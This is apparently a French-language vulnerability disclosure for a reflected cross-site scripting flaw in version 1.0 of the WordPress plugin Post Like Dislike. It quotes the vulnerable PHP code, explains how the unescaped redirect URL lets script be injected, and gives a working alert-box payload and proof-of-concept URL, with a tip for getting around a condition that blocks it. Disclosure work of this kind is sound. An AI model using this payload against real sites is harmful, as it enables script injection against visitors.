---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress Post Like Dislike"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin [Post Like Dislike](https://wordpress.org/plugins/post-like-dislike/) se présente de cette façon :

> By this plugin you can get like dislike of your post.
> From the plugin admin pannel you can choose where you want to put the thumb left or right and top or bottom.
> 
> Here is two kind of voting system — Anonymous Vote and Registered Vote.
> 1) Anonymous Vote – Any one can vote here. It is not necessary to register for vote. It is depend on session, if session destroy you can vote again
> 2) Registered Vote – Only Registered member can vote

La version testée est la 1.0 qui date d'il y a 10 ans au moment de ces lignes.

## La vulnérabilité

Dans le script `post-like-dislike.php` on trouve un hook pour modifier l'entête des pages web :

```php
add_action('wp_head', 'like_post')
```

Voici cette fonction `like_post` :

```php
function like_post($content)
{
    if ($_REQUEST['act'] == 'like' && $_REQUEST['q'] != "" && $_SESSION[$_REQUEST['q'].'_post_like'] == "")                   
    {
        $_SESSION[$_REQUEST['q'].'_post_like'] = 'done';
        $counts = get_post_meta($_REQUEST['q'],'like_post',true)+1;
        add_post_meta($_REQUEST['q'], 'like_post', $counts, true);
        update_post_meta($_REQUEST['q'], 'like_post', $counts);
        $url_rdir = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?p=".$_REQUEST['q'];

        if (get_option('vote_type') == 'reg') {
            $current_user = wp_get_current_user();
            $usr_id = $current_user->ID;
            $vote_done = get_option('vote_done');
            if ($vote_done == '') {
                $vote_done[$usr_id] = $_REQUEST['q'];
                add_option('vote_done', $vote_done);
            } else {
                if ($vote_done[$usr_id] == '') {
                    $vote_done[$usr_id] = $_REQUEST['q'];
                } else {
                    $vote_pst = explode(",",$vote_done[$usr_id]);
                    for ($i=0; $i<=count($vote_pst); $i++) {
                        if ($vote_pst[$i] != $_REQUEST['q']) {
                            $do_vote = "yes";
                            break;
                        }
                    }                                                                                                  
                    if ($do_vote == 'yes') {
                        $vote_done[$usr_id] = $vote_done[$usr_id].",".$_REQUEST['q'];
                    }
                }
                update_option('vote_done', $vote_done);
            }
        }
    ?>
        <script type="text/javascript">
            window.location = "<?php echo $url_rdir; ?>";
        </script>
        <?php
    }
    if ($_REQUEST['act'] == 'unlike' && $_REQUEST['q'] != "" && $_SESSION[$_REQUEST['p'].'_post_like'] == "") {
    --- snip, code presque similaire, snip ---
```

Ce qui nous intéresse, c'est le traitement de la variable `$url_rdir` qui est affichée sans échappement préalable des caractères HTML.

On peut voir qu'elle est générée à partir d'éléments sous notre contrôle, en particulier la query string :

```php
$url_rdir = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?p=".$_REQUEST['q'];
```

Pour réussir l'exploitation qui se situe au milieu d'une balise `script`, il faut d'abord faire échouer le code javascript courant pour l'empêcher de faire une redirection qui bloquerait l'exécution de notre code.

Pour cela, il suffit par exemple de ne pas fermer la chaine de caractère courante (pas de double quote).

On injectera alors quelque chose de très simple comme :

```html
</script><script>alert(/XSS/)</script>
```

Bref, on ferme la balise courante qui échouera pour une raison de syntaxe et on en ouvre une nouvelle.

PoC :

```
http://localhost:8000/?q=%3C%2FsCrIpT%3E%3CScRiPt%3Ealert%28%2FXSS%2F%29%3C%2FsCrIpT%3E&act=unlike
```

J'ai remarqué que l'exploitation échoue avec le paramètre `act` valant `like` si le post a déjà été liké.

Pour passer outre, il vaut mieux passer `act=unlike` qui semble marcher à tous les coups.
